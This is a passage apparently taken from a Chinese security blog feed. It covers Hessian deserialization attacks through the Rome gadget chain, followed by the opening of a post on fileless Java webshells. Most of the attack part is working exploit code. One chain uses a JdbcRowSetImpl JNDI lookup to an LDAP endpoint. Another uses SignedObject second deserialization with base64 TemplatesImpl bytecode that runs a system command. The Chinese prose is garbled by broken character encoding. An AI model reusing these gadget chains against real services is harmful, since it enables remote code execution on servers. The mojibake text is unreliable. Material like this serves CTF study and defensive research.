class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> moonflower.hessian;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.ObjectNameDeserializer;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hessian_Rome</span> &#123;<br><span class="hljs-comment">//åŒ…è£…åºåˆ—åŒ–çš„å‡½æ•°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-type">byte</span>[] serialize(T o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bao</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">HessianOutput</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(bao);<br>        output.writeObject(o);<br>        System.out.println(bao.toString());<br>        <span class="hljs-keyword">return</span> bao.toByteArray();<br>    &#125;<br>    <span class="hljs-comment">//åŒ…è£…ååºåˆ—åŒ–çš„å‡½æ•°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; T <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bai</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">HessianInput</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(bai);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> input.readObject();<br>        <span class="hljs-keyword">return</span> (T) o;<br>    &#125;<br><span class="hljs-comment">//åå°„è®¾ç½®value</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><span class="hljs-comment">//åå°„è·å–value</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">(Object obj, String name)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> field.get(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">jdbcRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ldap://localhost:9999/EXP&quot;</span>;<br>        jdbcRowSet.setDataSourceName(url);<br><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSet);<br>        <span class="hljs-type">EqualsBean</span> <span class="hljs-variable">equalsBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ToStringBean.class,toStringBean);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> makeMap(equalsBean, <span class="hljs-string">&quot;1&quot;</span>);<br><br>        <span class="hljs-type">byte</span>[] s = serialize(hashMap);<br>        System.out.println(s);<br>        System.out.println((HashMap)deserialize(s));<br>    &#125;<br><br>    <span class="hljs-comment">// ç”¨åå°„åŠ¨æ€åˆ›å»ºæ•°ç»„ï¼Œé˜²æ­¢åœ¨ç‹—ä»” gadget çš„æ—¶å€™è§¦å‘ put æ–¹æ³•å¯¼è‡´ RCEã€‚</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap&lt;Object, Object&gt; <span class="hljs-title function_">makeMap</span> <span class="hljs-params">(Object v1, Object v2)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        setValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        Class&lt;?&gt; nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.until.HashMap$Node&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v1, v1, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, v2, v2, <span class="hljs-literal">null</span>));<br>        setValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>Romeçš„rceè¿‡ç¨‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">synchronized</span> (_cachedTypeDeserializerMap) &#123;<br>  _cachedTypeDeserializerMap.put(type, deserializer);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿›å…¥è§¦å‘ç‚¹ï¼Œæ¥ç€è°ƒç”¨ EqualBean çš„ hashcode æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236540.png" alt="image-20230124203554850"></p><p>æ¥ç€ä¼šè§¦å‘ ToStringBean çš„ toString æ–¹æ³•ï¼ˆè¿™é‡Œå°±æœ‰å¾ˆå¤šå…¶å®ƒå»¶ç”³äº†ï¼Œæ¯”å¦‚å¯ä»¥æ¥ä¸€ä¸ª CC5ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236941.png" alt="image-20230124203614807"></p><p>æ¥ç€è¿›å…¥ JdbcRowSetImp çš„ toString æ–¹æ³•ï¼Œåœ¨å…¶ä¸­ä¼šè°ƒç”¨ JdbcRowSetImp çš„ getter</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236500.png" alt="image-20230124203639615"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236710.png" alt="image-20230124203654578"></p><p>å½“è°ƒç”¨åˆ° getDatabaseMetaData çš„æ—¶å€™ï¼Œä¼šè¿›å…¥ connect æ–¹æ³•ï¼Œè¿›è€Œè°ƒç”¨ lookup è§¦å‘ jndi æ³¨å…¥ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236799.png" alt="image-20230124203716717"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072236183.png" alt="image-20230124203736906"></p><h2 id="ä¸å‡ºç½‘æ‰“æ³•ï¼ˆROMEï¼‰"><a href="#ä¸å‡ºç½‘æ‰“æ³•ï¼ˆROMEï¼‰" class="headerlink" title="ä¸å‡ºç½‘æ‰“æ³•ï¼ˆROMEï¼‰"></a>ä¸å‡ºç½‘æ‰“æ³•ï¼ˆROMEï¼‰</h2><p><code>hessian</code>ååºåˆ—åŒ–ä¾èµ–<code>rome</code>çš„ä¸å‡ºç½‘åˆ©ç”¨æ–¹å¼</p><h4 id="SignedObjectäºŒæ¬¡ååºåˆ—åŒ–"><a href="#SignedObjectäºŒæ¬¡ååºåˆ—åŒ–" class="headerlink" title="SignedObjectäºŒæ¬¡ååºåˆ—åŒ–"></a>SignedObjectäºŒæ¬¡ååºåˆ—åŒ–</h4><p>åœ¨<code>java.security.SignedObject</code>ä¸­æœ‰ä¸€ä¸ª<code>getObject</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span><br>    <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br>&#123;<br>    <span class="hljs-comment">// creating a stream pipe-line, from b to a</span><br>    <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(<span class="hljs-built_in">this</span>.content);<br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(b);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> a.readObject();<br>    b.close();<br>    a.close();<br>    <span class="hljs-keyword">return</span> obj;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ˜¯ä¸€ä¸ªåŸç”Ÿååºåˆ—åŒ–ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨è¿™é‡Œå®ç°äºŒæ¬¡ååºåˆ—åŒ–ä»è€Œå®ç°RCEã€‚</p></blockquote><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> sun.security.provider.DSAPrivateKey;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">romeExp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, SignatureException, InvalidKeyException &#123;<br>        HashMap hashMapx=getObject();<br><br>        <span class="hljs-comment">//æ„é€ SignedObjectå¯¹è±¡</span><br>        SignedObject signedObject=<span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(hashMapx, <span class="hljs-keyword">new</span> <span class="hljs-title class_">DSAPrivateKey</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Signature</span>(<span class="hljs-string">&quot;x&quot;</span>) &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">engineInitVerify</span><span class="hljs-params">(PublicKey publicKey)</span> <span class="hljs-keyword">throws</span> InvalidKeyException &#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">engineInitSign</span><span class="hljs-params">(PrivateKey privateKey)</span> <span class="hljs-keyword">throws</span> InvalidKeyException &#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">engineUpdate</span><span class="hljs-params">(<span class="hljs-type">byte</span> b)</span> <span class="hljs-keyword">throws</span> SignatureException &#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">engineUpdate</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] b, <span class="hljs-type">int</span> off, <span class="hljs-type">int</span> len)</span> <span class="hljs-keyword">throws</span> SignatureException &#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-type">byte</span>[] engineSign() <span class="hljs-keyword">throws</span> SignatureException &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];<br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">engineVerify</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] sigBytes)</span> <span class="hljs-keyword">throws</span> SignatureException &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">engineSetParameter</span><span class="hljs-params">(String param, Object value)</span> <span class="hljs-keyword">throws</span> InvalidParameterException &#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">engineGetParameter</span><span class="hljs-params">(String param)</span> <span class="hljs-keyword">throws</span> InvalidParameterException &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>        &#125;);<br><br><br>        <span class="hljs-comment">//æ„é€ ToStringBean</span><br>        ToStringBean toStringBean=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(SignedObject.class,signedObject);<br>        ToStringBean toStringBean1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(String.class,<span class="hljs-string">&quot;s&quot;</span>);<br><br>        <span class="hljs-comment">//æ„é€ ObjectBean</span><br>        ObjectBean objectBean=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ToStringBean.class,toStringBean1);<br><br>        <span class="hljs-comment">//æ„é€ HashMap</span><br>        HashMap hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(objectBean,<span class="hljs-string">&quot;novic4&quot;</span>);<br><br>        <span class="hljs-comment">//åå°„ä¿®æ”¹å­—æ®µ</span><br>        Field obj= EqualsBean.class.getDeclaredField(<span class="hljs-string">&quot;_obj&quot;</span>);<br>        Field equalsBean=ObjectBean.class.getDeclaredField(<span class="hljs-string">&quot;_equalsBean&quot;</span>);<br><br>        obj.setAccessible(<span class="hljs-literal">true</span>);<br>        equalsBean.setAccessible(<span class="hljs-literal">true</span>);<br><br>        obj.set(equalsBean.get(objectBean),toStringBean);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        HessianOutput hessianOutput=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(ser);<br>        hessianOutput.writeObject(hashMap);<br>        hessianOutput.close();<br><br>        System.out.println(ser);<br>        HessianInput hessianInput=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(ser.toByteArray()));<br>        hessianInput.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String name,Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        Field field=obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj,value);<br>    &#125;<br><br>    <span class="hljs-comment">//è·å–åŸç”Ÿååºåˆ—åŒ–å¯¹è±¡</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-comment">//æ„é€ TemplatesImplå¯¹è±¡</span><br>        <span class="hljs-type">byte</span>[] bytecode= Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAIAoABgATCgAUABUIABYKABQAFwcACQcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAZAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBAAlDb2RlLmphdmEMAAcACAcAGwwAHAAdAQAEY2FsYwwAHgAfAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAADAAEAA0ADQAOAAsAAAAEAAEADAABAA0ADgACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAAEgALAAAABAABAA8AAQANABAAAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABYACwAAAAQAAQAPAAEAEQAAAAIAEg==&quot;</span>);<br>        <span class="hljs-type">byte</span>[][] bytee= <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytecode&#125;;<br>        TemplatesImpl templates=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,bytee);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;Code&quot;</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">//æ„é€ ToStringBean</span><br>        ToStringBean toStringBean=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class,templates);<br>        ToStringBean toStringBean1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(String.class,<span class="hljs-string">&quot;s&quot;</span>);<br><br>        <span class="hljs-comment">//æ„é€ ObjectBean</span><br>        ObjectBean objectBean=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ToStringBean.class,toStringBean1);<br><br>        <span class="hljs-comment">//æ„é€ HashMap</span><br>        HashMap hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(objectBean,<span class="hljs-string">&quot;novic4&quot;</span>);<br><br>        <span class="hljs-comment">//åå°„ä¿®æ”¹å­—æ®µ</span><br>        Field obj=EqualsBean.class.getDeclaredField(<span class="hljs-string">&quot;_obj&quot;</span>);<br>        Field equalsBean=ObjectBean.class.getDeclaredField(<span class="hljs-string">&quot;_equalsBean&quot;</span>);<br><br>        obj.setAccessible(<span class="hljs-literal">true</span>);<br>        equalsBean.setAccessible(<span class="hljs-literal">true</span>);<br><br>        obj.set(equalsBean.get(objectBean),toStringBean);<br><br>        <span class="hljs-keyword">return</span>  hashMap;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaWebå†…å­˜é©¬å­¦ä¹ </title>
      <link href="/2023/01/20/Java%E5%AE%89%E5%85%A8%E4%B9%8B%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2023/01/20/Java%E5%AE%89%E5%85%A8%E4%B9%8B%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaWebå†…å­˜é©¬"><a href="#JavaWebå†…å­˜é©¬" class="headerlink" title="JavaWebå†…å­˜é©¬"></a>JavaWebå†…å­˜é©¬</h1><h2 id="0x00-å‰ç½®çŸ¥è¯†"><a href="#0x00-å‰ç½®çŸ¥è¯†" class="headerlink" title="0x00 å‰ç½®çŸ¥è¯†"></a>0x00 å‰ç½®çŸ¥è¯†</h2><h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>å†…å­˜é©¬åˆåæ— æ–‡ä»¶é©¬ï¼Œè§åçŸ¥æ„ï¼Œä¹Ÿå°±æ˜¯æ— æ–‡ä»¶è½åœ°çš„ webshell æŠ€æœ¯ï¼Œæ˜¯ç”±äº webshell ç‰¹å¾è¯†åˆ«ã€é˜²ç¯¡æ”¹ã€ç›®å½•ç›‘æ§ç­‰ç­‰é’ˆå¯¹ web åº”ç”¨ç›®å½•æˆ–æœåŠ¡å™¨æ–‡ä»¶é˜²å¾¡æ‰‹æ®µçš„ä»‹å…¥ï¼Œå¯¼è‡´çš„æ–‡ä»¶ shell éš¾ä»¥å†™å…¥å’ŒæŒä¹…è€Œè¡ç”Ÿå‡ºçš„ä¸€ç§â€œæ¦‚å¿µå‹â€æœ¨é©¬ã€‚è¿™ç§æŠ€æœ¯çš„æ ¸å¿ƒæ€æƒ³éå¸¸ç®€å•ï¼Œä¸€å¥è¯å°±èƒ½æ¦‚æ‹¬ï¼Œé‚£å°±æ˜¯å¯¹è®¿é—®è·¯å¾„æ˜ å°„åŠç›¸å…³å¤„ç†ä»£ç çš„<strong>åŠ¨æ€æ³¨å†Œ</strong>ã€‚</p><h3 id="Tomcatä¸­çš„ä¸‰ç§Context"><a href="#Tomcatä¸­çš„ä¸‰ç§Context" class="headerlink" title="Tomcatä¸­çš„ä¸‰ç§Context"></a>Tomcatä¸­çš„ä¸‰ç§Context</h3><p>åœ¨Tomcatä¸­ï¼ŒContextæ˜¯Containerç»„ä»¶çš„ä¸€ç§å­å®¹å™¨ï¼Œå…¶å¯¹åº”çš„æ˜¯ä¸€ä¸ªWebåº”ç”¨ã€‚Contextä¸­å¯ä»¥åŒ…å«å¤šä¸ªWrapperå®¹å™¨ï¼Œè€ŒWrapperå¯¹åº”çš„æ˜¯ä¸€ä¸ªå…·ä½“çš„Servletå®šä¹‰ã€‚å› 